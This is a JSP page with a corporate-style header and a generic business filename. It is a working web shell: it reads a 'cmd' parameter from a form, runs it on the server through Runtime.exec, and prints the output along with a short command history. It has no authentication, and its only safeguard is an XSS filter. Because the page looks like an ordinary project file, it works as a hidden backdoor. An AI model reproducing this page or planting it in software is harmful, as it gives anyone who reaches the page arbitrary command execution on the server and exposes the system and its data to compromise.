<%
/*=========================================================
*Copyright(c) 2009 CyberLogitec
*@FileName       : ESM_SAQ_INF.jsp
*@FileTitle      : 
*Open Issues     :
*Change history  :
*@LastModifyDate : 
*@LastModifier   : 
*@LastVersion    : 1.0
* 1.0 Creation
=========================================================*/
%>

<%@ page language="java" contentType="text/html; charset=EUC-KR"
    pageEncoding="EUC-KR"
    import="
		javax.servlet.ServletRequest
		java.io.InputStreamReader
		java.io.BufferedReader
		java.lang.Runtime
		java.lang.Process"
    %>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=EUC-KR">
<title>Insert title here</title>
</head>
<body>
<%!
String[] cmds = {"", "", "", "", "", "", "", "", "", ""};
int cmdIdx = 0;
%>
<%
//String cmd = request.getParameter("cmd");
String cmd = StringUtil.xssFilter(request.getParameter("cmd")); //소스 품질 수정 요청건
if(cmd == null){
	cmd = "";
}
%>
<form name="frm" action="ESM_SAQ_INF.jsp" method="POST">
<input type="text" name="cmd" style="width:100%" value="<%=cmd %>" alt="Window : cmd /c  , Unix : ">
</form>
<%
	if(cmd != null && !cmd.equals("")){
		cmds[cmdIdx++] = cmd;
		for(int i = cmds.length - 1 ; i >= 0  ; i--){
			String t = cmds[(cmdIdx+i)%cmds.length];
			if(!t.equals("")){
				out.println(t+"<BR>");
			}
		}
		cmdIdx = cmdIdx % 10;
%>
<pre>
<%
		Runtime run = Runtime.getRuntime();
		Process proc = run.exec(cmd);
		InputStreamReader isr = new InputStreamReader(proc.getInputStream());
		BufferedReader br = new BufferedReader(isr);
		String line = null;
		while((line = br.readLine()) != null){
			line = line.replaceAll("<", "&lt;").replaceAll(">", "&gt;");
			out.println(line + "");
		}
		br.close();
%>
</pre>
<%
	}

%>
</body>
</html>